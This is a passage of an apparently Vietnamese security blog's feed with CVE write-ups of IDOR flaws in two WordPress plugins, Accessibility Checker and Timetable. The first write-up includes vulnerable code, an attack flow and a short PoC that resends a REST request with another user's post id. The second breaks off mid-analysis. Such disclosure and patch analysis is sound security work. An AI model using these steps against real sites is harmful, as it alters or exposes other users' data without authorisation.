type&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$post_type  = get_post_type( $post );&#xA;$post_types = Helpers::get_option_as_array( &amp;#39;edac_post_types&amp;#39; );&#xA;if ( empty( $post_types ) || ! in_array( $post_type, $post_types, true ) ) {&#xA;    return new \WP_REST_Response([ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Post type not allowed&amp;#39; ], 400);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Xử lý violations&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$rules = edac_register_rules();&#xA;foreach ( $request[&amp;#39;violations&amp;#39;] as $violation ) {&#xA;    $rule_id = $violation[&amp;#39;ruleId&amp;#39;];&#xA;    // Lọc rule hợp lệ và lưu vào cơ sở dữ liệu&#xA;    (new Insert_Rule_Data())-&amp;gt;insert( $post, $rule_id, $impact, $html, $landmark, $landmark_selector, $selectors );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Cập nhật post meta và summary&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;update_post_meta( $post_id, &amp;#39;_edac_density_data&amp;#39;, [ $metrics[&amp;#39;elementCount&amp;#39;] ?? 0, $metrics[&amp;#39;contentLength&amp;#39;] ?? 0 ] );&#xA;( new Summary_Generator( $post_id ) )-&amp;gt;generate_summary();&#xA;update_post_meta( $post_id, &amp;#39;_edac_post_checked_js&amp;#39;, time() );&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Trả response&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;return new \WP_REST_Response([&#xA;    &amp;#39;success&amp;#39; =&amp;gt; true,&#xA;    &amp;#39;id&amp;#39; =&amp;gt; $post_id,&#xA;    &amp;#39;timestamp&amp;#39; =&amp;gt; time()&#xA;]);&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Attacker có &lt;strong&gt;Contributor account&lt;/strong&gt; có thể &lt;strong&gt;tùy ý thao túng tham số &lt;code&gt;id&lt;/code&gt; do client kiểm soát&lt;/strong&gt;, trỏ tới &lt;strong&gt;bất kỳ post nào&lt;/strong&gt;, trong khi kiểm tra quyền chỉ dựa trên &lt;code&gt;edit_posts&lt;/code&gt;. Điều này cho phép attacker &lt;strong&gt;ghi hoặc ghi đè dữ liệu &lt;code&gt;violations&lt;/code&gt; vào post không thuộc quyền sở hữu&lt;/strong&gt;, dẫn đến &lt;strong&gt;thay đổi trái phép dữ liệu của người dùng khác (IDOR)&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Khi tạo post bằng Contributor user, bạn sẽ thấy phần thống kê của &lt;strong&gt;Accessibility Checker&lt;/strong&gt; xuất hiện ngay trong trang chỉnh sửa bài viết.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-22-cve-2025-57886/post.png&#34; title=&#34;Thống kê của Accessibility Checker&#34; data-thumbnail=&#34;/posts/2025-12-22-cve-2025-57886/post.png&#34; data-sub-html=&#34;&lt;h2&gt;Post&lt;/h2&gt;&lt;p&gt;Thống kê của Accessibility Checker&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-22-cve-2025-57886/post.png&#39; alt=&#34;Post&#34; height=&#34;1048&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Thống kê của Accessibility Checker&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thử filter request bằng cụm từ &lt;code&gt;post-scan-results&lt;/code&gt; trong Burp History, bạn sẽ bắt được request hợp lệ do plugin cung cấp sẵn:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-22-cve-2025-57886/request.png&#34; title=&#34;Filter request trong Burp History&#34; data-thumbnail=&#34;/posts/2025-12-22-cve-2025-57886/request.png&#34; data-sub-html=&#34;&lt;h2&gt;Request&lt;/h2&gt;&lt;p&gt;Filter request trong Burp History&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-22-cve-2025-57886/request.png&#39; alt=&#34;Request&#34; height=&#34;1357&#34; width=&#34;1277&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Filter request trong Burp History&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Chỉ cần sửa đối giá trị &lt;code&gt;id&lt;/code&gt;, ta có thể &lt;strong&gt;thay đổi trái phép dữ liệu&lt;/strong&gt; trong post của người khác.&lt;/p&gt;&#xA;&lt;p&gt;Phiên bản &lt;strong&gt;v1.30.1&lt;/strong&gt; đã sửa lỗ hổng bằng cách thay đổi &lt;strong&gt;permission callback&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;permission_callback&amp;#39; =&amp;gt; function ( $request ) {&#xA;    return $this-&amp;gt;user_can_edit_passed_post_id( $request );&#xA;}&#xA;&#xA;public function user_can_edit_passed_post_id( $request ) {&#xA;    $post_id = (int) $request[&amp;#39;id&amp;#39;];&#xA;    return current_user_can( &amp;#39;edit_post&amp;#39;, $post_id );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Callback giờ nhận &lt;code&gt;$request&lt;/code&gt; để kiểm tra &lt;strong&gt;post cụ thể&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Sử dụng &lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt; → WordPress xác minh:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;User có quyền chỉnh sửa post này hay không.&lt;/li&gt;&#xA;&lt;li&gt;Post có thuộc sở hữu của user hay không.&lt;/li&gt;&#xA;&lt;li&gt;Trạng thái post (draft, published, private) có cho phép thao tác không.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated attacker (Contributor&amp;#43;)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Craft POST request to REST API&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;POST /wp-json/accessibility-checker/v1/post-scan-results/{id}&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Manipulate {id} to target post_id&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;permission_callback: current_user_can(&amp;#39;edit_posts&amp;#39;)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Permission granted&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;set_post_scan_results()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;get_post(target_post_id)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Process violations data&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;update_post_meta(target_post_id, _edac_*)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Target post data modified&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo/edit post bằng &lt;strong&gt;Contributor&lt;/strong&gt; account&lt;/li&gt;&#xA;&lt;li&gt;Bắt request đến &lt;code&gt;/wp-json/accessibility-checker/v1/post-scan-results/{id}&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Gửi lại request với &lt;code&gt;id&lt;/code&gt; post của user khác với &lt;code&gt;violations&lt;/code&gt; tùy ý.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-57886 là một lỗ hổng &lt;strong&gt;IDOR trong REST API&lt;/strong&gt; do plugin &lt;strong&gt;Accessibility Checker by Equalize Digital&lt;/strong&gt; chỉ kiểm tra quyền ở mức &lt;strong&gt;capability tổng quát (&lt;code&gt;edit_posts&lt;/code&gt;)&lt;/strong&gt; mà không xác thực &lt;strong&gt;quyền chỉnh sửa trên post cụ thể&lt;/strong&gt;. Điều này cho phép attacker có quyền Contributor &lt;strong&gt;tùy ý thao túng tham số &lt;code&gt;id&lt;/code&gt;&lt;/strong&gt; trong request REST API để &lt;strong&gt;ghi hoặc ghi đè dữ liệu accessibility&lt;/strong&gt; lên các bài viết không thuộc quyền sở hữu, dẫn đến &lt;strong&gt;thay đổi trái phép dữ liệu&lt;/strong&gt;. Phiên bản 1.30.1 đã khắc phục bằng cách áp dụng &lt;strong&gt;post-level authorization&lt;/strong&gt; thông qua &lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;REST API sử dụng &lt;strong&gt;object identifier do client kiểm soát&lt;/strong&gt; phải luôn đi kèm &lt;strong&gt;kiểm tra quyền trên object cụ thể&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Global capability check&lt;/strong&gt; (&lt;code&gt;edit_posts&lt;/code&gt;) không đủ để bảo vệ các thao tác ghi dữ liệu theo &lt;code&gt;post_id&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;IDOR có thể xảy ra ngay cả khi request được tạo từ &lt;strong&gt;logic hợp lệ phía client&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Trong WordPress, &lt;strong&gt;&lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt;&lt;/strong&gt; là biện pháp chuẩn để ngăn chặn IDOR ở mức post.&lt;/li&gt;&#xA;&lt;li&gt;Các endpoint REST &lt;strong&gt;ghi dữ liệu&lt;/strong&gt; cần được xem là bề mặt tấn công ưu tiên khi audit plugin.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/accessibility-checker/vulnerability/wordpress-accessibility-checker-by-equalize-digital-plugin-1-30-0-insecure-direct-object-references-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Accessibility Checker by Equalize Digital Plugin &amp;lt;= 1.30.0 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12954 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-21-cve-2025-12954/</link>
      <pubDate>Sun, 21 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-21-cve-2025-12954/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin WordPress &lt;strong&gt;Timetable and Event Schedule by MotoPress&lt;/strong&gt; (trước phiên bản &lt;strong&gt;2.4.16&lt;/strong&gt;) không kiểm tra liệu người dùng có quyền truy cập vào &lt;strong&gt;event cụ thể&lt;/strong&gt; khi thực hiện thao tác duplicate, dẫn đến việc &lt;strong&gt;lộ thông tin event một cách tùy ý&lt;/strong&gt; đối với người dùng có vai trò thấp như &lt;strong&gt;Contributor&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12954&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12954&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.4.15&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.4.16&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/mp-timetable/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Timetable and Event Schedule Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Timetable and Event Schedule&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.15&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.16&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;post_action_mptt_duplicate_event&amp;#39;, array( $this-&amp;gt;get( &amp;#39;events&amp;#39; ), &amp;#39;post_action_mptt_duplicate_event&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong &lt;strong&gt;WordPress&lt;/strong&gt;, các hook có tiền tố &lt;code&gt;post_action_&lt;/code&gt; là hook đặc biệt dùng để xử lý những hành động được truyền qua tham số &lt;code&gt;action&lt;/code&gt; khi truy cập file &lt;code&gt;post.php&lt;/code&gt;.&#xA;Cụ thể, khi người dùng truy cập vào URL dạng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-admin/post.php?post=post_id&amp;amp;action=mptt_duplicate_event&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WordPress sẽ gọi đến callback &lt;code&gt;post_action_mptt_duplicate_event&lt;/code&gt; để xử lý logic &lt;strong&gt;duplicate event&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Bên cạnh việc đăng ký action hook, plugin còn &lt;strong&gt;chủ động tạo URL kích hoạt action&lt;/strong&gt; này thông qua việc thêm một liên kết “Duplicate” vào danh sách hành động của mỗi bài viết trong trang quản trị.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function post_row_actions( $actions, $post ) {&#xA;    if ( $post-&amp;gt;post_type == $this-&amp;gt;post_type &amp;amp;&amp;amp; current_user_can(&amp;#39;edit_posts&amp;#39;) ) {&#xA;&#xA;        $action_url = add_query_arg(&#xA;            array(&#xA;                &amp;#39;post&amp;#39; =&amp;gt; $post-&amp;gt;ID,&#xA;                &amp;#39;action&amp;#39; =&amp;gt; &amp;#39;mptt_duplicate_event&amp;#39;,&#xA;                &amp;#39;_wpnonce&amp;#39; =&amp;gt; wp_create_nonce( &amp;#39;mptt_duplicate_event&amp;#39; )&#xA;            ),&#xA;            admin_url( &amp;#39;post.php&amp;#39; )&#xA;        );&#xA;&#xA;        $actions[&amp;#39;duplicate&amp;#39;] = &amp;#39;&amp;lt;a href=&amp;#34;&amp;#39; . $action_url . &amp;#39;&amp;#34; aria-label=&amp;#34;&amp;#39; .&#xA;            __(&amp;#39;Duplicate&amp;#39;, &amp;#39;mp-timetable&amp;#39;) . &amp;#39;&amp;#34; rel=&amp;#34;permalink&amp;#34;&amp;gt;&amp;#39; . __(&amp;#39;Duplicate&amp;#39;, &amp;#39;mp-timetable&amp;#39;) . &amp;#39;&amp;lt;/a&amp;gt;&amp;#39;;&#xA;    }&#xA;&#xA;    return $actions;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này dùng hook &lt;code&gt;post_row_actions&lt;/code&gt; để &lt;strong&gt;thêm link Duplicate&lt;/strong&gt; vào danh sách action của mỗi bài viết trong 